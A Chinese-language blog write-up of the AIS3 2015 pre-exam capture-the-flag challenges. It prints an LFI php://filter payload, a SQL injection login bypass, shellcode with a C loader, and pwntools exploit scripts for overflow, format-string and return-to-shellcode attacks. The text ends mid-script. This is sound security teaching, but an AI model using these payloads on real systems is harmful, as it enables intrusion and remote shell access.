<!DOCTYPE html>



<html lang="zh-TW" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="AIS3 2015 pre-exam – complete writeup" />
<meta property="og:locale" content="zh_TW" />
<meta name="description" content="考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人 這個 blog 的第一篇中文 writeup 就獻給這篇了 XD 基本上就是全包這次 exam 的所有題目 有問題歡迎留言討論" />
<meta property="og:description" content="考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人 這個 blog 的第一篇中文 writeup 就獻給這篇了 XD 基本上就是全包這次 exam 的所有題目 有問題歡迎留言討論" />
<link rel="canonical" href="http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/" />
<meta property="og:url" content="http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/" />
<meta property="og:site_name" content="Hacking Tube 2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2015-08-06T20:15:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="AIS3 2015 pre-exam – complete writeup" />
<meta name="twitter:site" content="@bruce30262" />
<script type="application/ld+json">
{"url":"http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/","headline":"AIS3 2015 pre-exam – complete writeup","dateModified":"2021-07-19T21:12:41+08:00","datePublished":"2015-08-06T20:15:00+08:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/"},"description":"考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人 這個 blog 的第一篇中文 writeup 就獻給這篇了 XD 基本上就是全包這次 exam 的所有題目 有問題歡迎留言討論","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>AIS3 2015 pre-exam -- complete writeup | Hacking Tube 2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hacking Tube 2.0">
<meta name="application-name" content="Hacking Tube 2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/images/other/gravatar.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Hacking Tube 2.0</a>
    </div>

    <div class="site-subtitle font-italic">Security and stuff</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/bruce30262" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/bruce30262" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['bruce30262','pm.me'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>AIS3 2015 pre-exam -- complete writeup</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>AIS3 2015 pre-exam -- complete writeup</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Bruce Chen
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Aug  6, 2015,  8:15 PM +0800"
  

  
  prep="on" >

  
  

  
    Aug  6, 2015
  

  <i class="unloaded">2015-08-06T20:15:00+08:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Mon, Jul 19, 2021,  9:12 PM +0800"
  

  prefix="Updated "
   >

  
  

  
    Jul 19
  

  <i class="unloaded">2021-07-19T21:12:41+08:00</i>

</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4924 words">27 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p>考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人<br />
這個 blog 的第一篇中文 writeup 就獻給這篇了 XD<br />
基本上就是全包這次 exam 的所有題目<br />
有問題歡迎留言討論</p>

<!-- more -->

<h1 id="misc">MISC</h1>
<h2 id="misc1">MISC1</h2>
<p>沒啥特別，範例 flag <code class="language-plaintext highlighter-rouge">AIS3{hello_world}</code></p>

<h2 id="misc2">MISC2</h2>
<p>給了一個 facebook.zip，有密碼<br />
老實說我最討厭這種需要解壓縮檔密碼的題目 = =<br />
每次打 CTF 遇到這類型題目沒有一次解出來過 = =<br />
也因此是我卡最久的一題</p>

<p>之後才知道說要用到一種攻擊叫做 <strong>known plaintext attack</strong><br />
給定一個加密過的檔案，可以利用原檔案進行攻擊解密出 key<br />
網路上還有 tool 可以解，叫 <a href="https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html">pkcrack</a></p>

<p>因為壓縮檔裡面有張加密過的圖片<br />
所以可以根據檔名，想辦法 google 到原圖<br />
然後根據 pkcrack 官方網站裡面的 document 說明來進行解密<br />
基本上就是將原圖也壓成一個 zip 檔<br />
之後用 pkcrack 解出 <code class="language-plaintext highlighter-rouge">key0</code>, <code class="language-plaintext highlighter-rouge">key1</code> 和 <code class="language-plaintext highlighter-rouge">key2</code><br />
最後用裡面附的 <code class="language-plaintext highlighter-rouge">zipdecrypt</code> 來解出壓縮檔裡面所有的檔案，就可以拿到 flag 了<br />
flag: <code class="language-plaintext highlighter-rouge">AIS3{old_trick_fool_the_zip_password}</code></p>

<h2 id="misc3">MISC3</h2>
<p>Orange 說 MISC3 出錯了 (´・ω・`)<br />
導致這題比 MISC2 還要簡單 XD<br />
給了個壓縮檔，解出來後是張白白的圖片<br />
乍看之下沒什麼，不過剛好那時我的筆電螢幕有傾斜，看出了色差，所以直接看出了 flag XD<br />
flag: <code class="language-plaintext highlighter-rouge">AIS3{picture_in_picture_0xcc}</code></p>

<h1 id="web">WEB</h1>
<h2 id="web1">WEB1</h2>
<p>連進去試了幾下之後發現是 LFI 的漏洞<br />
之後就一直嘗試繞過字串過濾的限制<br />
然後就卡住了 = =<br />
最後才發現是要用 <code class="language-plaintext highlighter-rouge">PHP I/O stream</code> 的 <code class="language-plaintext highlighter-rouge">php://filter</code> 來將 index.php 的內容轉成 base64 encode 然後 dump 出來<br />
payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://[HOST]/web1/?page=php://filter/convert.base64-encode/resource=index
</pre></td></tr></tbody></table></code></div></div>

<p>這東西算是打 WEB 的基本 trick<br />
對於 web 苦手的我來說算是長知識了<br />
flag: <code class="language-plaintext highlighter-rouge">AIS3{php_wrapper_rocks}</code></p>

<h2 id="web2">WEB2</h2>
<p>給了我們一個 .txt 檔<br />
一看就知道跟 javascript 有關<br />
可是一直想不起來它的名字 = =<br />
google了好久之後才查到它叫 <a href="http://www.jsfuck.com/">jsfuck</a></p>

<p>之後就簡單許多了，直接 google jsfuck decoder 就可以有現成的 code 可以解了<br />
(聽說可以用 Firefox 秒解)<br />
flag: <code class="language-plaintext highlighter-rouge">AIS3{fuck_the_javascript_interpreter}</code></p>

<h2 id="web3">WEB3</h2>
<p>這次 exam 唯一沒有解出來的一題<br />
原因也很簡單，就是 web 實力太弱，知道的 trick 不夠多 ( web 真的很吃 trick 啊…)</p>

<p>總之就是一個有登入頁面跟顯示新聞頁面的網站<br />
顯示新聞頁面的 URL 有吃 get 參數<br />
所以就先用 <a href="http://sqlmap.org/">sqlmap</a> 掃一下<br />
發現沒洞 ( sqlmap 回報說參數應是有用<code class="language-plaintext highlighter-rouge">int()</code>擋掉 SQL injection )</p>

<p>之後就是不斷的嘗試別的思路<br />
包括從登入頁面那邊用 SQL injection 打進去<br />
可惜知道的 trick (應該說是 payload format ) 不夠多<br />
導致試到 exam 結束時都沒有試出來</p>

<p>之後向 Orange 問了解法以及解題思路，他是這麼回答的:</p>

<blockquote>
  <p>其實只要在登入頁面的 username 欄位那邊<br />
輸入 <code class="language-plaintext highlighter-rouge">aaaaa\</code><br />
就會發現 database error<br />
如此一來就可以推斷出網站沒有濾 <code class="language-plaintext highlighter-rouge">\</code> 字元<br />
剩下的就是構造 payload</p>
</blockquote>

<p>看到這邊，其實還是不是很了解<br />
主要的原因是因為我一直以為”過濾”<code class="language-plaintext highlighter-rouge">'</code>字元的意思是說直接把<code class="language-plaintext highlighter-rouge">'</code>取代成空字串<br />
但是在問過學長之後，發現其實不是這樣子的</p>

<p>身為一個 web service<br />
通常不會把一個使用者的 input 做任意的修改 (包括砍掉其中的字元)<br />
而是會嘗試將所有的 input 都送進 database 裡面<br />
因此在遇到<code class="language-plaintext highlighter-rouge">'</code>字元的時候，通常會利用反斜線來 escape 掉，也就是變成 <code class="language-plaintext highlighter-rouge">\'</code><br />
這樣子的行為也可以是一種”過濾”</p>

<p>那麼因為網站沒有過濾反斜線，只有過濾<code class="language-plaintext highlighter-rouge">'</code><br />
因此我們在 username 那欄可以這麼輸入: <code class="language-plaintext highlighter-rouge">aaa\' OR 1=1 #</code><br />
這個時候，因為網站過濾<code class="language-plaintext highlighter-rouge">'</code>但沒有過濾<code class="language-plaintext highlighter-rouge">\</code>的關係，使得 username 的 data 將會變成</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>aaa\\' OR 1=1 #
</pre></td></tr></tbody></table></code></div></div>
<p>塞進 SQL 做 query 時就會變成:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="p">[</span><span class="k">table_name</span><span class="p">]</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'aaa</span><span class="se">\\</span><span class="s1">'</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">#</span><span class="s1">' AND password = </span><span class="se">''</span><span class="s1">
</span></pre></td></tr></tbody></table></code></div></div>
<p>如此一來就可以繞過檢查，成功登入(登入之後就會看到 flag 了)</p>

<h1 id="binary">BINARY</h1>
<h2 id="binary1">BINARY1</h2>
<p>拿到 binary 之後也沒多想<br />
直接 <code class="language-plaintext highlighter-rouge">strings</code> 下下去<br />
發現有噴出 <code class="language-plaintext highlighter-rouge">AIS3{strings_help_you_a_lot_isnt}</code><br />
直接拿來 submit，瘋狂噴錯 = =<br />
最後腦補成 <code class="language-plaintext highlighter-rouge">AIS3{strings_help_you_a_lot_isnt_it}</code>就過了…</p>

<h2 id="binary2">BINARY2</h2>
<p>給了一份文件</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41
\x41\x41\x50\x48\xb8\xbc\xa0\xa9
\x93\xaa\xa3\xbe\x93\x50\x48\xb8
\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1
\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0
\xaf\xa3\xa8\x50\x48\xb8\x8d\x85
\x9f\xff\xb7\xa3\xa7\x93\x50\x48
\x89\xe6\x48\x31\xd2\x80\x34\x16
\xcc\xfe\xc2\x80\xfa\x25\x75\xf5
\x48\x31\xc0\x48\xff\xc0\x48\x89
\xc7\x0f\x05\x6a\x3c\x58\x48\x31
\xff\x0f\x05
</pre></td></tr></tbody></table></code></div></div>
<p>一開始還以為 decode hex 之後會是一種檔案格式<br />
結果發現不是，就卡了一段時間<br />
之後腦洞打開想說會不會是 shellcode<br />
看了一下 hex value 又覺得應該不是 x86 的 machine code<br />
於是就直接寫了個 .c 檔編成 64 bit ELF 直接下去跑</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\xb8\xb5\xa3\xb9\xb1\xc6\x41\x41\x41\x50\x48\xb8\xbc\xa0\xa9\x93\xaa\xa3\xbe\x93\x50\x48\xb8\xa9\x93\xa5\xbf\x93\xbf\xa5\xa1\x50\x48\xb8\xbf\xa4\xa9\xa0\xa0\xaf\xa3\xa8\x50\x48\xb8\x8d\x85\x9f\xff\xb7\xa3\xa7\x93\x50\x48\x89\xe6\x48\x31\xd2\x80\x34\x16\xcc\xfe\xc2\x80\xfa\x25\x75\xf5\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
	<span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">code</span><span class="p">;</span>
	<span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>bruce30262@ubuntu:~/Desktop/shellcode$ gcc -z execstack -o shell shell.c
bruce30262@ubuntu:~/Desktop/shellcode$ ./shell
AIS3{ok_shellcode_is_simple_for_you}
</pre></td></tr></tbody></table></code></div></div>
<p>難怪叫做 sc.txt, SC 就是 shellcode 的縮寫嘛 XD<br />
收工!</p>

<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{ok_shellcode_is_simple_for_you}</code></p>

<h2 id="binary3">BINARY3</h2>
<p>一開始給了一個叫做 stupid 的 binary<br />
64 bit ELF，有 strip 過<br />
那個時候想說要 reverse 覺得好麻煩就先去睡覺了XD<br />
結果第二天發了第二個版本 stupid_v2，裡面保留了所有的 symbol 資訊<br />
瞬間變得超級友善XDD<br />
直接丟進 IDA Pro 做靜態分析就足以把 key 解出來了</p>

<p>簡單來說程式會要你輸入input<br />
然後會做兩次檢查( check1 和 check2 )，如果都通過的話就代表你輸入的 input 就是 flag<br />
雖然說是做兩次檢查，但是因為 check1 和 check2 之間 input 沒有被動到<br />
且兩者之間毫無關聯性，因此可以推得只要過得了 check2 就一定過得了 check1<br />
那麼 check1 似乎就不是那麼重要了，重點擺在 check2 即可</p>

<p>而 check2 的檢查也十分簡單:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>; key = 0xDDDDAAAADADADDAA ^ (our_input)
cmp     dword ptr key, 0BFB7B8CEh
setz    al
cmp     dword ptr key+4, 0BCB4DEC4h
setz    ah
xor     ax, 101h
</pre></td></tr></tbody></table></code></div></div>

<p>也就是說，只要我們的 input  xor  <code class="language-plaintext highlighter-rouge">0xDDDDAAAADADADDAA</code> == <code class="language-plaintext highlighter-rouge">0xBCB4DEC4BFB7B8CE</code> 的話，就代表著我們的 input = flag<br />
而 xor 的反解也相當簡單，即再做一次 xor 即可<br />
因此 flag = <code class="language-plaintext highlighter-rouge">0xDDDDAAAADADADDAA ^ 0xBCB4DEC4BFB7B8CE</code> = <code class="language-plaintext highlighter-rouge">0x6169746E656D6564</code><br />
之後轉成 ascii code, endianness 注意一下，即可得到正確的 input = <code class="language-plaintext highlighter-rouge">dementia</code></p>

<p>flag: <code class="language-plaintext highlighter-rouge">AIS3{dementia}</code></p>

<h1 id="pwn3d">PWN3D</h1>
<p>( pwn 的 flag 全忘光了，這邊就純分享解法 &amp; payload 囉 )</p>
<h2 id="pwn3d1">PWN3D1</h2>
<p>64 bit ELF, 直接丟進 IDA Pro 就會看到邪惡的 <code class="language-plaintext highlighter-rouge">scanf()</code> 和一個看起來就是要你蓋它的變數<br />
分析了一下，發現只要將那個變數蓋成 <code class="language-plaintext highlighter-rouge">0x90909090</code> 就會噴 flag<br />
計算好 offset 之後就可以構造 payload 丟給 server 了<br />
一開始直接用 <code class="language-plaintext highlighter-rouge">python -c</code> pipe 進 nc 的方式送<br />
不知道為什麼一直沒有噴 flag 回來<br />
最後只好乖乖寫 script</p>
<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.163.194"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1111</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># setting 
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="c1">#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)
</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90</span><span class="s">"</span> 
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name: </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="pwn3d2">PWN3D2</h2>
<p>32 bit ELF, 單純的 echo server，輸入啥 input 就印啥出來(嗎?)</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">echo</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-14h]@1</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-10h]@1</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>可以看到 <code class="language-plaintext highlighter-rouge">read()</code> 那邊有個 overflow 的漏洞<br />
然後 <code class="language-plaintext highlighter-rouge">__printf_chk()</code> 那邊也有個 format string 的漏洞</p>

<p>使用 <a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> 檢查之後發現沒開 DEP<br />
那麼方向就很明顯了: return to shellcode<br />
先利用 format string leak 出 ebp, 得到目前 stack 的位置，並計算 input buffer 的 address<br />
透過第一次 overflow 覆寫 return address，讓程式執行完 <code class="language-plaintext highlighter-rouge">echo()</code> 之後重新回到 <code class="language-plaintext highlighter-rouge">echo()</code> 的開頭<br />
此時我們拿到了 input buffer 的 address<br />
就可以在 buffer 上面塞 shellcode<br />
並透過第二次的 overflow 讓 return address 跳到我們的 shellcode 上面執行拿到 shell</p>

<p>要注意的是 buffer 只給我們 20 byte, 而我的 shellcode 有 23 byte<br />
因此最後我是將 shellcode 塞在 return address 後面，並向後跳至 shellcode 位址執行</p>
<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.163.194"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">2222</span>
<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># setting 
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
<span class="c1">#elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)
</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="c1">#r = process("./pwn2")
</span><span class="n">shellcode_byte</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span 